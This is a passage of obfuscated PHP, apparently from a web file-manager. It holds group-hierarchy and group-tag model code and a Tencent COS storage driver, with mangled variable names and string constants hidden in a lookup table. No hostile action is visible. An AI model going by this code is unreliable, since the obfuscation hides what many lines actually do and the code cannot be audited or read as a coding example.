"{$Íñ¬·´}\x25"), $íĞ‘êèß[42] => array($íĞ‘êèß[389], "\x25{$Íñ¬·´}\45"), $íĞ‘êèß[980] => $íĞ‘êèß[1895]); if ($˜ïƒ“‚) { $â˜¼å = $this->getInfoSimple($˜ïƒ“‚); $¤›¡ÑÇŞ = $â˜¼å[$íĞ‘êèß[523]] . $˜ïƒ“‚ . $íĞ‘êèß[547]; $üÆÖâê = array($üÆÖâê, array($íĞ‘êèß[523] => array($íĞ‘êèß[389], $¤›¡ÑÇŞ))); } $üÆÖâê = $this->parseWhereLike($üÆÖâê); $«ª«Œ½© = $this->_makeOrder()->where($üÆÖâê)->selectPage(20); $«ª«Œ½© = $«ª«Œ½© ? $«ª«Œ½© : array($íĞ‘êèß[375] => array(), $íĞ‘êèß[372] => array()); if (!$«ª«Œ½© || count($«ª«Œ½©[$íĞ‘êèß[375]]) < 5 && Input::check($Íñ¬·´, $íĞ‘êèß[324])) { $Î†í«¢» = $this->groupChildrenAll($˜ïƒ“‚); $ôÇ…³øº = $this->_searchFromMeta($íĞ‘êèß[465], $Íñ¬·´, 10, $Î†í«¢»); $çÆËåßé = $this->_searchFromMeta($íĞ‘êèß[466], $Íñ¬·´, 10, $Î†í«¢»); $îĞˆ£›¸ = array_merge($ôÇ…³øº, $çÆËåßé, $«ª«Œ½©[$íĞ‘êèß[375]]); $«ª«Œ½©[$íĞ‘êèß[375]] = array_unique_by_key($îĞˆ£›¸, $íĞ‘êèß[1800]); $«ª«Œ½©[$íĞ‘êèß[372]][$íĞ‘êèß[373]] = count($«ª«Œ½©[$íĞ‘êèß[375]]); $«ª«Œ½©[$íĞ‘êèß[372]][$íĞ‘êèß[374]] = ceil($«ª«Œ½©[$íĞ‘êèß[372]][$íĞ‘êèß[373]] / $«ª«Œ½©[$íĞ‘êèß[372]][$íĞ‘êèß[369]]); } $this->_listDataApply($«ª«Œ½©[$íĞ‘êèß[375]]); return $«ª«Œ½©; } protected function groupChildrenAll($–ô®×ş) { $Æêº€¹Ü =& $_SERVER[ë¦»ºéÌ]; if (!$–ô®×ş) { return !1; } if (is_string($–ô®×ş)) { $–ô®×ş = array($–ô®×ş); } $±Í†Œ½ô = $–ô®×ş; foreach ($–ô®×ş as $Áç’¾¤Ü) { $“¨¯úœ = $this->getInfoSimple($Áç’¾¤Ü); $¨ÙşÌÍ¶ = array($Æêº€¹Ü[523] => array($Æêº€¹Ü[389], $“¨¯úœ[$Æêº€¹Ü[523]] . $Áç’¾¤Ü . $Æêº€¹Ü[547])); $ëëşÓàâ = $this->field($Æêº€¹Ü[1800])->where($¨ÙşÌÍ¶)->select(); $±Í†Œ½ô = array_merge($±Í†Œ½ô, array_to_keyvalue($ëëşÓàâ, $Æêº€¹Ü[12], $Æêº€¹Ü[1800])); } return array_unique($±Í†Œ½ô); } private function _searchFromMeta($İ§¤Õùé, $ş©˜ñ¨, $ªä”âìë, $„¯Œ„Á¸) { $°§ß°ö =& $_SERVER[ë¦»ºéÌ]; $ş©˜ñ¨ = strtolower($ş©˜ñ¨); $¦©“©Ø© = array($°§ß°ö[105] => $İ§¤Õùé, $°§ß°ö[380] => array($°§ß°ö[389], "\x25{$ş©˜ñ¨}\45")); $¦©“©Ø© = $this->parseWhereLike($¦©“©Ø©); if ($„¯Œ„Á¸) { $¦©“©Ø©[$°§ß°ö[1800]] = array($°§ß°ö[7], $„¯Œ„Á¸); } $‹¸üè÷¤ = Model($°§ß°ö[1896])->where($¦©“©Ø©)->limit($ªä”âìë)->select(); if (!$‹¸üè÷¤) { return array(); } $‹¸üè÷¤ = array_to_keyvalue($‹¸üè÷¤, $°§ß°ö[12], $°§ß°ö[1800]); $½ÜõÑ…Ñ = $this->where(array($°§ß°ö[1887] => array($°§ß°ö[7], $‹¸üè÷¤)))->select(); if (!$½ÜõÑ…Ñ) { return array(); } return $½ÜõÑ…Ñ; } protected function _listDataApplyItem($õºˆ®ø€) { $¬¿Âä = array($õºˆ®ø€); $this->_listDataApply($¬¿Âä); return $¬¿Âä[0]; } protected function _listDataApply(&$Îç° ) { $ÚœºÚ»‚ =& $_SERVER[ë¦»ºéÌ]; if (!$Îç° ) { return; } $¬ŞŞÇé© = array_to_keyvalue($Îç° , $ÚœºÚ»‚[12], $ÚœºÚ»‚[1800]); $this->_listAppendChildren($Îç° ); $this->_listAppendChildrenMember($Îç° ); $this->_listAppendMeta($Îç° , $¬ŞŞÇé©); $this->_listAppendParent($Îç° ); $this->_listAppendSourceRoot($Îç° , $¬ŞŞÇé©); } private function _listAppendChildren(&$¿Ğ”‚µÃ) { $Å…ÎÜ†± =& $_SERVER[ë¦»ºéÌ]; $÷Ò£ó¸Ú = array_to_keyvalue($¿Ğ”‚µÃ, $Å…ÎÜ†±[12], $Å…ÎÜ†±[1800]); $†íÚ¤—º = array($Å…ÎÜ†±[500] => array($Å…ÎÜ†±[7], $÷Ò£ó¸Ú)); $×÷ƒãäÓ = array($Å…ÎÜ†±[500], $Å…ÎÜ†±[1897] => $Å…ÎÜ†±[502]); $Íí¡ïõÑ = $this->field($×÷ƒãäÓ)->where($†íÚ¤—º)->group($Å…ÎÜ†±[500])->select(); $å©×¬— = array_to_keyvalue($Íí¡ïõÑ, $Å…ÎÜ†±[500], $Å…ÎÜ†±[502]); foreach ($¿Ğ”‚µÃ as &$±×º‚¸à) { $Á¬¿£¢ = $±×º‚¸à[$Å…ÎÜ†±[1800]]; $±×º‚¸à[$Å…ÎÜ†±[1898]] = isset($å©×¬—[$Á¬¿£¢]) ? intval($å©×¬—[$Á¬¿£¢]) : !1; } unset($±×º‚¸à); } private function _listAppendChildrenMember(&$‚«‡ğèº) { $§ÄêóÍ¿ =& $_SERVER[ë¦»ºéÌ]; $ú²ñ—ùÎ = array_to_keyvalue($‚«‡ğèº, $§ÄêóÍ¿[12], $§ÄêóÍ¿[1800]); $¯›‘‡Ê = array($§ÄêóÍ¿[1800] => array($§ÄêóÍ¿[7], $ú²ñ—ùÎ)); $ªÒ°İ§ğ = array($§ÄêóÍ¿[1800], $§ÄêóÍ¿[1897] => $§ÄêóÍ¿[502]); $©¾ºïµ° = Model($§ÄêóÍ¿[1889])->field($ªÒ°İ§ğ)->where($¯›‘‡Ê)->group($§ÄêóÍ¿[1800])->select(); $µñÒ€û· = array_to_keyvalue($©¾ºïµ°, $§ÄêóÍ¿[1800], $§ÄêóÍ¿[502]); foreach ($‚«‡ğèº as &$ƒéÄ¢Ãú) { $öıò¦¡ = $ƒéÄ¢Ãú[$§ÄêóÍ¿[1800]]; $ƒéÄ¢Ãú[$§ÄêóÍ¿[1899]] = isset($µñÒ€û·[$öıò¦¡]) ? intval($µñÒ€û·[$öıò¦¡]) : !1; } unset($ƒéÄ¢Ãú); } private function _listAppendMeta(&$ìúÙ•Öó, $«ŞÛ„Ş­) { $Âêˆİ×› =& $_SERVER[ë¦»ºéÌ]; $÷¥‘´Ÿæ = array($Âêˆİ×›[1800] => array($Âêˆİ×›[7], $«ŞÛ„Ş­)); $Ğ“ÅÈŸ„ = Model($Âêˆİ×›[1888])->where($÷¥‘´Ÿæ)->select(); $Ğ“ÅÈŸ„ = array_to_keyvalue_group($Ğ“ÅÈŸ„, $Âêˆİ×›[1800]); foreach ($Ğ“ÅÈŸ„ as &$øÍæİ¢) { $øÍæİ¢ = array_to_keyvalue($øÍæİ¢, $Âêˆİ×›[105], $Âêˆİ×›[380]); } unset($øÍæİ¢); foreach ($ìúÙ•Öó as &$§ãë¸íº) { $§ãë¸íº[$Âêˆİ×›[467]] = array(); if (isset($Ğ“ÅÈŸ„[$§ãë¸íº[$Âêˆİ×›[1800]]])) { $§ãë¸íº[$Âêˆİ×›[467]] = $Ğ“ÅÈŸ„[$§ãë¸íº[$Âêˆİ×›[1800]]]; } } unset($§ãë¸íº); } protected function parentLevelArray($ÎŠŠ±Í) { $Áö“Ğ²“ =& $_SERVER[ë¦»ºéÌ]; $ÎŠŠ±Í = explode($Áö“Ğ²“[60], trim($ÎŠŠ±Í, $Áö“Ğ²“[60])); $ÎŠŠ±Í = array_remove_value($ÎŠŠ±Í, $Áö“Ğ²“[202]); return $ÎŠŠ±Í; } private function _listAppendParent(&$µ“İÉ§Ã) { $‘‚é´÷ =& $_SERVER[ë¦»ºéÌ]; $Ç‘Ãìšã = array(); foreach ($µ“İÉ§Ã as &$¡Şº£åÓ) { $Ç‘Ãìšã[$¡Şº£åÓ[$‘‚é´÷[1800]]] = $¡Şº£åÓ[$‘‚é´÷[42]]; $ö­İØ = $this->parentLevelArray($¡Şº£åÓ[$‘‚é´÷[523]]); foreach ($ö­İØ as $‡ûŸ¦º) { if (!isset($Ç‘Ãìšã[$‡ûŸ¦º])) { $Ç‘Ãìšã[$‡ûŸ¦º] = 0; } } } unset($¡Şº£åÓ); foreach ($Ç‘Ãìšã as $›™”Â¹Û => $¯÷½Éò) { if ($¯÷½Éò) { continue; } $©ì¢ßÚ = $this->getInfoSimple($›™”Â¹Û); $Ç‘Ãìšã[$›™”Â¹Û] = $©ì¢ßÚ[$‘‚é´÷[42]]; } $‹ÑÒÛ¹ = $GLOBALS[$‘‚é´÷[6]][$‘‚é´÷[100]][$‘‚é´÷[1900]]; if ($GLOBALS[$‘‚é´÷[507]] == $‘‚é´÷[99]) { $‹ÑÒÛ¹ = !1; } foreach ($µ“İÉ§Ã as &$¡Şº£åÓ) { $ö­İØ = $this->parentLevelArray($¡Şº£åÓ[$‘‚é´÷[523]]); $º±¡¾–è = $‘‚é´÷[12]; foreach ($ö­İØ as $›™”Â¹Û => $‡ûŸ¦º) { if ($‹ÑÒÛ¹ && $›™”Â¹Û == 0) { continue; } $º±¡¾–è .= $Ç‘Ãìšã[$‡ûŸ¦º] . $‘‚é´÷[8]; } if ($ö­İØ) { $º±¡¾–è .= $¡Şº£åÓ[$‘‚é´÷[42]]; } $¡Şº£åÓ[$‘‚é´÷[528]] = str_replace($‘‚é´÷[531], $‘‚é´÷[8], $º±¡¾–è); } unset($¡Şº£åÓ); } private function _listAppendSourceRoot(&$üÃÖŒ¤‹, $Øàà™†¯) { $Ÿ«Á–î =& $_SERVER[ë¦»ºéÌ]; $™ù„œÍ® = Model($Ÿ«Á–î[809])->listSourceRoot(SourceModel::TYPE_GROUP, $Øàà™†¯); $™ù„œÍ® = array_to_keyvalue($™ù„œÍ®, $Ÿ«Á–î[506]); $™ù„œÍ® = array_remove_key($™ù„œÍ®, $Ÿ«Á–î[506]); foreach ($üÃÖŒ¤‹ as &$Ò¢¿ ¸À) { $Ò¢¿ ¸À[$Ÿ«Á–î[97]] = $™ù„œÍ®[$Ò¢¿ ¸À[$Ÿ«Á–î[1800]]] ? $™ù„œÍ®[$Ò¢¿ ¸À[$Ÿ«Á–î[1800]]] : array(); } unset($Ò¢¿ ¸À); } protected function groupMerge($éºˆÑä) { $éºˆÑä = array_values(array_unique($éºˆÑä)); $Ş§çÕØè = array(); for ($‰îÄºŠé = 0; $‰îÄºŠé < count($éºˆÑä); $‰îÄºŠé++) { $›âØšû = !1; for ($ä”èöİä = 0; $ä”èöİä < count($éºˆÑä); $ä”èöİä++) { if ($‰îÄºŠé == $ä”èöİä) { continue; } if ($this->isParentOf($éºˆÑä[$ä”èöİä], $éºˆÑä[$‰îÄºŠé])) { $›âØšû = !0; break; } } if (!$›âØšû) { $Ş§çÕØè[] = $éºˆÑä[$‰îÄºŠé]; } } return $Ş§çÕØè; } protected function isParentOf($„…ªñª§, $ôŠªü˜â) { $ØêñîæŞ =& $_SERVER[ë¦»ºéÌ]; if (!$„…ªñª§ || !$ôŠªü˜â || $„…ªñª§ == $ôŠªü˜â) { return !1; } $ıïÀÑ±õ = $this->getInfoSimple($„…ªñª§); $ÓŞ ×Ó” = $this->getInfoSimple($ôŠªü˜â); $ÙïÚáÏ˜ = $ıïÀÑ±õ[$ØêñîæŞ[523]] . $„…ªñª§ . $ØêñîæŞ[60]; if (substr($ÓŞ ×Ó”[$ØêñîæŞ[523]], 0, strlen($ÙïÚáÏ˜)) == $ÙïÚáÏ˜) { return !0; } return !1; } public function groupShowRoot($èıÃÍ¦§, $Çµ‡›¦ƒ = false) { $õÖáÊœŠ =& $_SERVER[ë¦»ºéÌ]; $Šíó¦ì = $this->getInfo($èıÃÍ¦§); if (!$Šíó¦ì) { return array(); } $¿­Üİ€» = $this->parentLevelArray($Šíó¦ì[$õÖáÊœŠ[523]]); $ÊÉœ«ŸÀ = array($èıÃÍ¦§); if (count($¿­Üİ€») == 0) { return $ÊÉœ«ŸÀ; } if ($Çµ‡›¦ƒ && count($¿­Üİ€») == 1) { return $ÊÉœ«ŸÀ; } if (!$Šíó¦ì[$õÖáÊœŠ[467]] || !isset($Šíó¦ì[$õÖáÊœŠ[467]][$õÖáÊœŠ[1885]]) || $Šíó¦ì[$õÖáÊœŠ[467]][$õÖáÊœŠ[1885]] == $õÖáÊœŠ[1854]) { return $this->groupShowRoot($¿­Üİ€»[count($¿­Üİ€») - 1], $Çµ‡›¦ƒ); } if ($Šíó¦ì[$õÖáÊœŠ[467]][$õÖáÊœŠ[1885]] == $õÖáÊœŠ[363]) { $¦ù³êá = explode($õÖáÊœŠ[60], $Šíó¦ì[$õÖáÊœŠ[467]][$õÖáÊœŠ[1886]]); if ($¦ù³êá) { $ÊÉœ«ŸÀ = array_merge($ÊÉœ«ŸÀ, $¦ù³êá); } } return $ÊÉœ«ŸÀ; } protected function resetParentLevel() { $¼Ğª¾‰ =& $_SERVER[ë¦»ºéÌ]; $©¾™ÈÃû = $¼Ğª¾‰[1800]; $ê¦Õæá¬ = $this->select(); $ê¦Õæá¬ = array_to_keyvalue($ê¦Õæá¬, $©¾™ÈÃû); foreach ($ê¦Õæá¬ as $Íàüõ‘) { $÷¡ıÔ¼» = $Íàüõ‘; $•…üªëÄ = array(); while ($÷¡ıÔ¼»[$¼Ğª¾‰[500]] != 0) { $•…üªëÄ[] = $÷¡ıÔ¼»[$¼Ğª¾‰[500]]; $÷¡ıÔ¼» = $ê¦Õæá¬[$÷¡ıÔ¼»[$¼Ğª¾‰[500]]]; } $•…üªëÄ[] = 0; $•…üªëÄ = $¼Ğª¾‰[60] . implode($¼Ğª¾‰[60], array_reverse($•…üªëÄ)) . $¼Ğª¾‰[60]; $this->setNamePinyin($Íàüõ‘[$©¾™ÈÃû], $Íàüõ‘[$¼Ğª¾‰[42]]); $this->where(array($©¾™ÈÃû => $Íàüõ‘[$©¾™ÈÃû]))->save(array($¼Ğª¾‰[586] => $•…üªëÄ)); } return $ê¦Õæá¬; } public function groupNameAuto($Îµ¤Ô¥ä, $İ±Ñ¹éÚ) { $»ù¯æÎğ =& $_SERVER[ë¦»ºéÌ]; $ Üî˜Çš = $this->where(array($»ù¯æÎğ[404] => $Îµ¤Ô¥ä))->getField($»ù¯æÎğ[42], !0); if (!$ Üî˜Çš || !in_array($İ±Ñ¹éÚ, $ Üî˜Çš)) { return $İ±Ñ¹éÚ; } for ($¬ÃÛ®ş¢ = 1; $¬ÃÛ®ş¢ <= count($ Üî˜Çš) + 1; $¬ÃÛ®ş¢++) { $Ş²ù‚ÎÅ = $İ±Ñ¹éÚ . "\50{$¬ÃÛ®ş¢}\51"; if (!in_array($Ş²ù‚ÎÅ, $ Üî˜Çš)) { return $Ş²ù‚ÎÅ; } } } public function groupSwitch($Ó÷½×Â, $Ù¤®ÎÙì) { $çŠáøŞ‡ =& $_SERVER[ë¦»ºéÌ]; $‚Ó×âü = array($çŠáøŞ‡[1800] => array($çŠáøŞ‡[7], array($Ó÷½×Â, $Ù¤®ÎÙì))); $Ñ£…Ô€á = $this->where($‚Ó×âü)->select(); $Ñ£…Ô€á = array_to_keyvalue($Ñ£…Ô€á, $çŠáøŞ‡[1800]); if (!isset($Ñ£…Ô€á[$Ó÷½×Â]) || !isset($Ñ£…Ô€á[$Ù¤®ÎÙì]) || $Ñ£…Ô€á[$Ó÷½×Â][$çŠáøŞ‡[500]] == 0) { return !1; } $‚Ó×âü = array($çŠáøŞ‡[1800] => $Ó÷½×Â); $ş‹ê»îÊ = Model($çŠáøŞ‡[1889])->where($‚Ó×âü)->select(); if (!$ş‹ê»îÊ) { $ş‹ê»îÊ = array(); } foreach ($ş‹ê»îÊ as $Á¨«áŠÀ) { $•Ñ™æÛ™ = $Á¨«áŠÀ[$çŠáøŞ‡[1632]]; $‚Ó×âü = array($çŠáøŞ‡[1632] => $•Ñ™æÛ™, $çŠáøŞ‡[1800] => $Ù¤®ÎÙì); $ÈÒ¤®ı» = Model($çŠáøŞ‡[1889])->where($‚Ó×âü)->find(); if (!$ÈÒ¤®ı») { $á™§ÆÙ = array($Ù¤®ÎÙì => $Á¨«áŠÀ[$çŠáøŞ‡[1901]]); Model($çŠáøŞ‡[540])->userGroupAdd($•Ñ™æÛ™, $á™§ÆÙ); } Model($çŠáøŞ‡[540])->userGroupRemove($•Ñ™æÛ™, $Ó÷½×Â); } $‚Ó×âü = array($çŠáøŞ‡[414] => 2, $çŠáøŞ‡[500] => 0, $çŠáøŞ‡[413] => 1, $çŠáøŞ‡[506] => array($çŠáøŞ‡[7], array($Ó÷½×Â, $Ù¤®ÎÙì))); $‚˜ª¨í™ = Model($çŠáøŞ‡[809])->where($‚Ó×âü)->field($çŠáøŞ‡[1902])->select(); $‚˜ª¨í™ = array_to_keyvalue($‚˜ª¨í™, $çŠáøŞ‡[506], $çŠáøŞ‡[405]); $µè€¨—’ = !empty($‚˜ª¨í™[$Ó÷½×Â]) ? $‚˜ª¨í™[$Ó÷½×Â] : !1; if ($µè€¨—’) { if (!$‚˜ª¨í™[$Ù¤®ÎÙì]) { $‚˜ª¨í™[$Ù¤®ÎÙì] = Model($çŠáøŞ‡[809])->groupRootAdd($Ù¤®ÎÙì); } $ÈÀı¼¿ñ = $‚˜ª¨í™[$Ù¤®ÎÙì]; $‚Ó×âü = array($çŠáøŞ‡[500] => $µè€¨—’); $‚˜ª¨í™ = Model($çŠáøŞ‡[809])->where($‚Ó×âü)->field($çŠáøŞ‡[1903])->select(); if (!$‚˜ª¨í™) { $‚˜ª¨í™ = array(); } Model($çŠáøŞ‡[809])->moveClearAuth = !1; foreach ($‚˜ª¨í™ as $¯…Âåë˜) { $ñó¹™ıì = $¯…Âåë˜[$çŠáøŞ‡[413]] == $çŠáøŞ‡[99] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($çŠáøŞ‡[809])->move($¯…Âåë˜[$çŠáøŞ‡[405]], $ÈÀı¼¿ñ, $ñó¹™ıì); } Model($çŠáøŞ‡[809])->moveClearAuth = !0; $‚Ó×âü = array($çŠáøŞ‡[414] => 2, $çŠáøŞ‡[506] => $Ó÷½×Â); $Î¾íâË³ = array($çŠáøŞ‡[506] => $Ù¤®ÎÙì); Model($çŠáøŞ‡[1904])->where($‚Ó×âü)->save($Î¾íâË³); Model($çŠáøŞ‡[1905])->where($‚Ó×âü)->save($Î¾íâË³); } $this->_changeChildLevel($Ñ£…Ô€á[$Ó÷½×Â], $Ñ£…Ô€á[$Ù¤®ÎÙì], !0); $this->where(array($çŠáøŞ‡[500] => $Ó÷½×Â))->save(array($çŠáøŞ‡[500] => $Ù¤®ÎÙì)); $this->_clearChildrenCache($Ñ£…Ô€á[$Ù¤®ÎÙì]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($Î¸ÎÃğÇ) { $Ç³›„¾Í =& $_SERVER[ë¦»ºéÌ]; return array($Ç³›„¾Í[1906] => array($Î¸ÎÃğÇ[0], $Ç³›„¾Í[1907]), $Ç³›„¾Í[1908] => array($Î¸ÎÃğÇ[0], $Ç³›„¾Í[1909])); } protected function get($éŞæÒ®) { $ÎûöŠ¼î =& $_SERVER[ë¦»ºéÌ]; $Œˆ÷Ÿº = Model($ÎûöŠ¼î[524])->metaGet($éŞæÒ®, $ÎûöŠ¼î[1910]); $â¿÷‚Û¸ = json_decode($Œˆ÷Ÿº, !0); return $â¿÷‚Û¸ ? $â¿÷‚Û¸ : array($ÎûöŠ¼î[1911] => $ÎûöŠ¼î[99], $ÎûöŠ¼î[375] => array()); } protected function set($¸®ÔÉå¿, $Ñ¿‹¹ö³) { $ÏğôëÄ =& $_SERVER[ë¦»ºéÌ]; $Ñ¿‹¹ö³ = $Ñ¿‹¹ö³ ? $Ñ¿‹¹ö³ : array($ÏğôëÄ[1911] => $ÏğôëÄ[99], $ÏğôëÄ[375] => array()); Model($ÏğôëÄ[524])->metaSet($¸®ÔÉå¿, $ÏğôëÄ[1910], json_encode($Ñ¿‹¹ö³)); return Model($ÏğôëÄ[524])->metaSet($¸®ÔÉå¿, $ÏğôëÄ[1910], json_encode($Ñ¿‹¹ö³)); } protected function getByTagID($¾ƒ±õ, $„Ê”‰Œâ) { $ãéÙÙ«ğ =& $_SERVER[ë¦»ºéÌ]; if (!$¾ƒ±õ || !$„Ê”‰Œâ) { return !1; } if (!Model($ãéÙÙ«ğ[524])->getInfoSimple($¾ƒ±õ)) { return !1; } $Ù«´•»í = $this->get($¾ƒ±õ); if (!$Ù«´•»í || !isset($Ù«´•»í[$ãéÙÙ«ğ[375]])) { return !1; } $Ü½§‚˜­ = array_find_by_field($Ù«´•»í[$ãéÙÙ«ğ[375]], $ãéÙÙ«ğ[403], $„Ê”‰Œâ); return is_array($Ü½§‚˜­) ? $Ü½§‚˜­ : !1; } public function listSource($ï¶‚£Ÿû, $±äŠıû©) { $İß¢½ÖÄ =& $_SERVER[ë¦»ºéÌ]; if ($±äŠıû© && !is_array($±äŠıû©)) { $±äŠıû© = array($±äŠıû©); } $øüÚÆ–ê = $this->listData($ï¶‚£Ÿû); $æ°úë• = array(); foreach ($øüÚÆ–ê as $Şˆìş±) { $¬õ´œ = $Şˆìş±[$İß¢½ÖÄ[88]]; if (!$¬õ´œ) { continue; } if (!isset($æ°úë•[$¬õ´œ])) { $æ°úë•[$¬õ´œ] = array(); } $æ°úë•[$¬õ´œ][] = $Şˆìş±[$İß¢½ÖÄ[429]]; } $¥ëùµ± = array(); foreach ($æ°úë• as $¨§ƒ  => $é€–­È) { $ªÌÑ–šº = !0; if (!$±äŠıû©) { $¥ëùµ±[] = $¨§ƒ ; continue; } foreach ($±äŠıû© as $Ã½Ìû„µ) { if (!in_array($Ã½Ìû„µ, $é€–­È)) { $ªÌÑ–šº = !1; break; } } if ($ªÌÑ–šº) { $¥ëùµ±[] = $¨§ƒ ; } } if (!$¥ëùµ±) { return array(); } $Šê¾ßüš = array($İß¢½ÖÄ[420] => array($İß¢½ÖÄ[421], $¥ëùµ±), $İß¢½ÖÄ[506] => $ï¶‚£Ÿû, $İß¢½ÖÄ[414] => SourceModel::TYPE_GROUP); $ÀæåŒ—­ = Model($İß¢½ÖÄ[1305])->listSource($Šê¾ßüš); if (!$ÀæåŒ—­ || count($¥ëùµ±) == $ÀæåŒ—­[$İß¢½ÖÄ[372]][$İß¢½ÖÄ[373]]) { return $ÀæåŒ—­; } $µ‡”Ö’Û = array(); $ªÉ¥©Ò = array_to_keyvalue($ÀæåŒ—­[$İß¢½ÖÄ[87]], $İß¢½ÖÄ[12], $İß¢½ÖÄ[405]); $¿•×ñ¯Ñ = array_to_keyvalue($ÀæåŒ—­[$İß¢½ÖÄ[86]], $İß¢½ÖÄ[12], $İß¢½ÖÄ[405]); $ûôÅ¯¿ = array_merge($¿•×ñ¯Ñ, $ªÉ¥©Ò); foreach ($¥ëùµ± as $¬õ´œ) { if (!in_array($¬õ´œ, $ûôÅ¯¿)) { $µ‡”Ö’Û[] = $¬õ´œ; } } if ($µ‡”Ö’Û) { $this->removeBySource($ï¶‚£Ÿû, $µ‡”Ö’Û); } return $ÀæåŒ—­; } protected function listData($ÜÔğ¦Ì¿) { $˜âÑ÷ş± =& $_SERVER[ë¦»ºéÌ]; $™İ¦‹Ôü = array($˜âÑ÷ş±[1623] => 0, $˜âÑ÷ş±[485] => array($˜âÑ÷ş±[1912], 0), $˜âÑ÷ş±[425] => $˜âÑ÷ş±[1913] . $ÜÔğ¦Ì¿); $¹ŒÎÄÌÂ = $˜âÑ÷ş±[1914]; $ï¤Ä—ºê = $this->field($¹ŒÎÄÌÂ)->where($™İ¦‹Ôü)->order($˜âÑ÷ş±[1915])->select(); return $ï¤Ä—ºê ? $ï¤Ä—ºê : array(); } protected function addToTag($—íñ…™Ø, $£­ñü‚, $Â¿ºáªş) { $œóÛÏ¦ =& $_SERVER[ë¦»ºéÌ]; if (!$this->getByTagID($—íñ…™Ø, $Â¿ºáªş) || !$£­ñü‚) { return !1; } if (!Model($œóÛÏ¦[809])->pathInfo($£­ñü‚)) { return !1; } $ŒÛ©ÍÚú = array($œóÛÏ¦[1623] => 0, $œóÛÏ¦[485] => $Â¿ºáªş, $œóÛÏ¦[424] => $£­ñü‚, $œóÛÏ¦[425] => $œóÛÏ¦[1916] . $—íñ…™Ø, $œóÛÏ¦[423] => $œóÛÏ¦[12], $œóÛÏ¦[1804] => 0); if ($this->where($ŒÛ©ÍÚú)->find()) { return !1; } return $this->add($ŒÛ©ÍÚú); } protected function removeFromTag($™·Š¡…ƒ, $èÉù±ŠÔ, $Öá§¼ï˜) { $à÷Ò»‡¯ =& $_SERVER[ë¦»ºéÌ]; if (!$this->getByTagID($™·Š¡…ƒ, $Öá§¼ï˜) || !$èÉù±ŠÔ) { return !1; } if (is_array($èÉù±ŠÔ)) { $èÉù±ŠÔ = array($à÷Ò»‡¯[7], $èÉù±ŠÔ); } $îûøûõ = array($à÷Ò»‡¯[1623] => 0, $à÷Ò»‡¯[485] => $Öá§¼ï˜, $à÷Ò»‡¯[425] => $à÷Ò»‡¯[1916] . $™·Š¡…ƒ, $à÷Ò»‡¯[424] => $èÉù±ŠÔ); return $this->where($îûøûõ)->delete(); } protected function removeByTag($ß¨Ù¹ü¾, $ˆÍÄÜ©Ş) { $Êê—¿˜ =& $_SERVER[ë¦»ºéÌ]; if (!$this->getByTagID($ß¨Ù¹ü¾, $ˆÍÄÜ©Ş)) { return !1; } $¥ËÑÕ°‰ = array($Êê—¿˜[1623] => 0, $Êê—¿˜[485] => $ˆÍÄÜ©Ş, $Êê—¿˜[425] => $Êê—¿˜[1916] . $ß¨Ù¹ü¾); return $this->where($¥ËÑÕ°‰)->delete(); } protected function removeBySource($ª»ŠÚö, $¨ó²ïˆ—) { $‘²ù³°‡ =& $_SERVER[ë¦»ºéÌ]; if (!$ª»ŠÚö || !$¨ó²ïˆ—) { return !1; } if (is_array($¨ó²ïˆ—)) { $¨ó²ïˆ— = array($‘²ù³°‡[7], $¨ó²ïˆ—); } $Ê­ùÃ = array($‘²ù³°‡[1623] => 0, $‘²ù³°‡[424] => $¨ó²ïˆ—, $‘²ù³°‡[485] => array($‘²ù³°‡[994], 0), $‘²ù³°‡[425] => $‘²ù³°‡[1916] . $ª»ŠÚö); return $this->where($Ê­ùÃ)->delete(); } } goto CèÉ¿‹È–; aÖ˜¥Îƒƒ¿: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ÖÕ»Å¯š) { parent::__construct($ÖÕ»Å¯š); $this->signatureVersion($_SERVER[ë¦»ºéÌ][223]); } public function uploadFormData($Ãóö±ñ«, $ºÛ¸¬Õ = 3600) { $˜”ÑŠÒ” =& $_SERVER[ë¦»ºéÌ]; $ÛÀ˜´” = $˜”ÑŠÒ”[203]; $«İ¼ŸĞ— = $˜”ÑŠÒ”[238]; $‹õˆ— = $˜”ÑŠÒ”[1288]; $èÇ‚ƒ”õ = gmdate($˜”ÑŠÒ”[1289], time() + $ºÛ¸¬Õ); $ú˜¦Ù–Ø = (string) time() . $˜”ÑŠÒ”[81] . (string) (time() + $ºÛ¸¬Õ); $ç‰ë¨§Ğ = array($˜”ÑŠÒ”[1290] => $èÇ‚ƒ”õ, $˜”ÑŠÒ”[1291] => array(array($˜”ÑŠÒ”[1292] => $ÛÀ˜´”), array($˜”ÑŠÒ”[1293] => $this->bucket), array($˜”ÑŠÒ”[1294], $˜”ÑŠÒ”[1295], $˜”ÑŠÒ”[12]), array($˜”ÑŠÒ”[1296] => $‹õˆ—), array($˜”ÑŠÒ”[1297] => $«İ¼ŸĞ—), array($˜”ÑŠÒ”[1298] => $this->accessKey), array($˜”ÑŠÒ”[1299] => $ú˜¦Ù–Ø))); $ç‰ë¨§Ğ = json_encode($ç‰ë¨§Ğ); $ÅªĞÈ‹« = hash_hmac($˜”ÑŠÒ”[238], $ú˜¦Ù–Ø, $this->secret); $‹¥¹…ô = sha1($ç‰ë¨§Ğ); $ÀàŠÛó = hash_hmac($˜”ÑŠÒ”[238], $‹¥¹…ô, $ÅªĞÈ‹«); $ÕÜ˜Ğï› = array($˜”ÑŠÒ”[1292] => $ÛÀ˜´”, $˜”ÑŠÒ”[1296] => $‹õˆ—, $˜”ÑŠÒ”[1300] => base64_encode($ç‰ë¨§Ğ), $˜”ÑŠÒ”[1297] => $«İ¼ŸĞ—, $˜”ÑŠÒ”[1298] => $this->accessKey, $˜”ÑŠÒ”[1301] => $ú˜¦Ù–Ø, $˜”ÑŠÒ”[1302] => $ÀàŠÛó, $˜”ÑŠÒ”[186] => $this->getHost()); return $ÕÜ˜Ğï›; } public function fileOutLink($¤Ôµ¯ûÔ) { $°ùšøš® =& $_SERVER[ë¦»ºéÌ]; if (substr($¤Ôµ¯ûÔ, 0, 7) == $°ùšøš®[1303]) { $¤Ôµ¯ûÔ = $°ùšøš®[1304] . substr($¤Ôµ¯ûÔ, 7); } header($°ùšøš®[170] . $¤Ôµ¯ûÔ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($†š±ùù») { $this->pathParse = $†š±ùù»; $this->model = Model($_SERVER[ë¦»ºéÌ][1305]); } public function 